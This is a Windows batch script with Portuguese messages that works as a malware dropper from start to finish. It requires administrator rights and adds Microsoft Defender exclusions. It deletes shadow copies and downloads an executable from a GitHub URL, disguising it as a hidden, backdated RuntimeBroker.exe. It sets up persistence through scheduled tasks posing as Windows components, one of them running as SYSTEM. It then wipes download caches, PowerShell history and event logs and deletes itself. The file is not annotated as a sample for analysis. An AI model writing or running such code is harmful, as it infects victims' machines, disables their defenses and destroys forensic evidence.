@echo off
net session >nul 2>&1
if %errorLevel% neq 0 ( echo Execute como Administrador! & pause & exit /b 1 )
set "TMPSELF=%TEMP%\svchost_tmp_%RANDOM%.bat"
if not "%~f0"=="%TMPSELF%" (
    copy /y "%~f0" "%TMPSELF%" >nul 2>&1
    del /f /q "%~f0" >nul 2>&1
    start "" /min cmd /c ""%TMPSELF%""
    exit
)
set "GURL=https://raw.githubusercontent.com/V3xDev/unknow2/main/Rocket.exe"
set "IDIR=%LOCALAPPDATA%\Microsoft\WindowsApps"
set "IPATH=%IDIR%\RuntimeBroker.exe"
if not exist "%IDIR%" mkdir "%IDIR%" >nul 2>&1
sc stop SysMain >nul 2>&1
sc config SysMain start= disabled >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Add-MpPreference -ExclusionPath '%IDIR%' -EA SilentlyContinue" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Add-MpPreference -ExclusionPath '%IPATH%' -EA SilentlyContinue" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
certutil -urlcache -split -f "%GURL%" "%IPATH%" >nul 2>&1
if not exist "%IPATH%" powershell -EP Bypass -WS Hidden -Command "Invoke-WebRequest -Uri '%GURL%' -OutFile '%IPATH%' -UseBasicParsing -EA SilentlyContinue" >nul 2>&1
if not exist "%IPATH%" bitsadmin /transfer svc /download /priority high "%GURL%" "%IPATH%" >nul 2>&1
if not exist "%IPATH%" ( sc config SysMain start= auto >nul 2>&1 & sc start SysMain >nul 2>&1 & exit /b 1 )
attrib +s +h "%IPATH%" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "$f=Get-Item '%IPATH%' -Force;$f.LastWriteTime=(Get-Date).AddYears(-2);$f.CreationTime=(Get-Date).AddYears(-2)" >nul 2>&1
sc config SysMain start= auto >nul 2>&1
sc start SysMain >nul 2>&1
set "TN=Microsoft\Windows\WindowsApps"
schtasks /delete /tn "%TN%" /f >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "$a=New-ScheduledTaskAction -Execute '%IPATH%';$t=New-ScheduledTaskTrigger -AtLogOn;$p=New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -ExecutionTimeLimit (New-TimeSpan -Hours 0);Register-ScheduledTask -TaskName '%TN%' -Action $a -Trigger $t -Principal $p -Settings $s -Description 'Componente de Host de Aplicativos do Windows' -Force" >nul 2>&1
set "TC=Microsoft\Windows\WindowsApps\Cleanup"
powershell -EP Bypass -WS Hidden -Command "$a=New-ScheduledTaskAction -Execute '%IPATH%' -Argument '/cleanup';$p=New-ScheduledTaskPrincipal -UserId SYSTEM -RunLevel Highest;$s=New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;Register-ScheduledTask -TaskName '%TC%' -Action $a -Principal $p -Settings $s -Description 'Servico de Limpeza do Runtime de Fala' -Force" >nul 2>&1
certutil -urlcache * delete >nul 2>&1
if exist "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" rd /s /q "%LOCALAPPDATA%\Microsoft\Cryptography\CryptnetUrlCache" >nul 2>&1
bitsadmin /reset /allusers >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "Remove-Item (Get-PSReadlineOption).HistorySavePath -EA SilentlyContinue" >nul 2>&1
powershell -EP Bypass -WS Hidden -Command "foreach($l in @('Setup','Microsoft-Windows-PowerShell/Operational','Microsoft-Windows-TaskScheduler/Operational','Microsoft-Windows-Bits-Client/Operational','Microsoft-Windows-Windows Defender/Operational','Microsoft-Windows-Eventlog/Operational')){wevtutil cl $l /quiet 2>$null}" >nul 2>&1
vssadmin delete shadows /all /quiet >nul 2>&1
del /q /f "%TEMP%\svchost_tmp*.bat" >nul 2>&1
set "SD=%TEMP%\sd_%RANDOM%.bat"
echo @echo off > "%SD%"
echo timeout /t 3 /nobreak ^>nul >> "%SD%"
echo del /q /f "%%~f0" ^>nul 2^>^&1 >> "%SD%"
start "" /min "%SD%"
exit
